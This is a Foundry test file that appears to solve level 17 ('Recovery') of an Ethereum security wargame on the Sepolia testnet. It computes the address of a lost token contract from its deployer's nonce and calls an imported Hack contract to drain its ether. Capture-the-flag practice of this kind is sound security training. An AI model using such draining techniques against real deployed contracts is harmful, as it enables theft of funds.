//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Recovery, SimpleToken, Hack} from "../src/level17.sol";

contract level17Test is Test {
    Recovery target;

    function setUp() public {
        vm.createSelectFork("SEPOLIA");
        address instanceAddress = vm.envAddress("INSTANCE_AD");
        target = Recovery(instanceAddress);
    }

    function testSolvesLeve17() public {
        address hacker = makeAddr("hacker");

        address simpleTokenAddress = vm.computeCreateAddress(
            address(target),
            1
        );
        console.log("address: ", simpleTokenAddress);

        SimpleToken token = SimpleToken(payable(simpleTokenAddress));
        uint256 balanceBefore = address(token).balance;
        console.log("SimpleToken balance before: ", balanceBefore);

        vm.startPrank(hacker, hacker);
        Hack hackContract = new Hack();
        hackContract.hack(simpleTokenAddress);
        vm.stopPrank();

        uint256 balanceAfter = address(token).balance;
        console.log("SimpleToken balance after: ", balanceAfter);
        assertEq(balanceAfter, 0);
    }
}
//INSTANCE_AD=0x949373148b5e6Da69Ef763D484aECab28A994C57 forge test --mt testSolvesLeve17 -vvv
